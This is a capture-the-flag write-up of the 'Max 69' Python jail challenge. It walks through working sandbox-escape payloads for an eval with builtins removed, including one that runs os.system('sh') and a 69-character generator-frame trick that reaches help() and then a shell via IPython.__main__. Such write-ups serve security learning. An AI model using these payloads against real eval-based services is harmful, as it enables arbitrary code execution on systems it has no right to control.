# Max 69

**Challenge Prompt:**

```python
inp = input('Gimme max 69!\n> ')
if not inp.isascii():
    quit('Give me ascii please')
if '__' in inp:
    quit('No thank you')
if len(inp) > 69:
    quit("Don't give me more than your favourite number")

eval(inp, {'__builtins__':{}}, {'__builtins__':{}})
```

## First thoughts

This is a part 2 of Max 420, but now we have to get it to 69 characters.

Previous solution used was:

```
(y:=[],y.append(z.gi_frame.f_back.f_back.f_builtins[f"{'_'}_import{'_'}_"]("os") for z in y), *[*y[0]][0].system("sh"))
```

Which is 119 characters.

`help` function is often used to get RCE:

```
(y:=[],y.append(z.gi_frame.f_back.f_back.f_builtins["help"]() for z in y), *[*y[0]])
```

But changing to call help we get down to 89.

## Doing research

So I spent time trying to find out what others have done as I couldn‚Äôt get it shorter. I went into a rabbit hole of trying to understand the scope.

I won‚Äôt go so much into details, but I realised the challenge had a ‚Äúbug‚Äù

Specifically in:

```python
eval(inp, {'__builtins__':{}}, {'__builtins__':{}})
```

Correct to limit builtins would be:

```python
eval(inp, {'__builtins__':{}}, None)
```

As it really is:

```python
eval(inp, globals={'__builtins__':{}}, locals=None)
```

After time I got this working when I changed locals to None:

```
(q:=(q.gi_frame.f_back.f_back.f_builtins['help']()for _ in[0]),[*q])
```

But it does not work with the challenge as local scope is not working properly, so the generator can‚Äôt access the `q` variable when it‚Äôs running.

I assume this is the point most players would be stuck at.

## Finding the first solution

This section might hurt a bit to people who have spent a lot of time.

I spent a lot of time trying to find a solution and I found this archived challenge ‚ÄúCompletely new challenge‚Äù on [Imaginary CTF](https://imaginaryctf.org/ArchivedChallenges/58)

Looking at attachment finds us this:

```python
assert ascii(x := input())[1:-1] != x.replace("__","")[:97], eval(x,{'__builtins__':{}},{'__builtins__':{}})
```

Where it uses eval in same way and also does not allow `__`.

So I decided to join Imaginary CTF Discord to see if any more discussion happened.

I searched `builtins` and found the channel and there were discussion of getting a shorter payload:

```
1in(g:=((g:=g.gi_frame.f_back.f_back.f_builtins)["exec"](g["input"]())for _ in[1]))
```

And this seems to be shortest with 83. Changing it to call help and remove unused brackets shortens it to 69:

```
1in(g:=(g:=g.gi_frame.f_back.f_back.f_builtins["help"]()for _ in[1]))
```

It works!

## How to get shell with help?

Next part is written as a draft, but added as time is running out.  
Will update writeup when I get time.  
But now is the other part of the challenge ‚Äî how do we get shell in `help()`?

Usually this can be done with less/more, but Docker is using socat. So less/more is not used (I believe this is the reason why).

So I spend time trying to see if anything changes when I load in new modules and try to run chal again, but nothing.

So I go around searching through other modules if I can get any info.

Then I try out sage because I saw it was installed from before, and yes it‚Äôs there in the help documentation. I was peeking around and wondering why!

After messing around I see a path to `/usr/bin/python3.13/site-packges/sage` I started wondering if I could see all `site-packges`. So I enter in `site-packages` and that‚Äôs possible. I try out a bit more to see if any of them might spawn a shell.

I try out Jedi because why not, and then I see a `__main__` as part of Jedi.

So I type into help:

```
jedi.__main__
```

And there I got kicked out of nc!

Looks like it errored trying to load the file? I see in docker log and it seems to miss something trying to import.

Could this be a way to get shell?

---

## Exploring local docker

I open up a local shell to my docker instance and `cd` to site-packages path and run:

```
find . -type f -name "__main__.py"
```

And I get this entire list:

```
./sage/doctest/__main__.py
./sage/repl/ipython_kernel/__main__.py
./jedi/__main__.py
...
./IPython/__main__.py
...
```

From context, it seems like they are files for CLI!

I first tried out the ipython kernel and I got a bit stuck there, nothing useful.  
Then I saw IPython and tried that one, and that gave me a shell!

```
IPython.__main__
```
